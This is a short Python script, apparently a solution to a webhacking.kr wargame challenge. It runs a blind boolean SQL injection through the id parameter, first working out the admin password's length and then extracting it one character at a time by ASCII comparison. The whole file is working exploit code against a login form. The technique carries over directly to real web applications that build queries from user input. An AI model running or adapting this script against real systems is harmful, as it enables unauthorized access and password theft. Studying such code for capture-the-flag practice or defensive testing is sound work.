import requests

id = "admin'"
url = 'https://webhacking.kr/challenge/bonus-1/index.php?id='
pw = '&pw=123'


# length
pw_length = 0
for i in range(40):
	res = requests.get(url + id + ' and length(pw)=' + str(i) + ' -- ' + pw)
	if ("wrong password" in res.text):
		print("pw length: {}".format(i))
		pw_length = i
		break

# pw string
ans = ""
for i in range(1, pw_length + 1):
	for j in range(65, 127):
		res = requests.get(url + id + ' and ascii(substr(pw, {}, 1))={} -- '.format(i, j) + pw)
		if ("wrong password" in res.text):
			ans += chr(j)
			print(ans)
			break

print(ans)
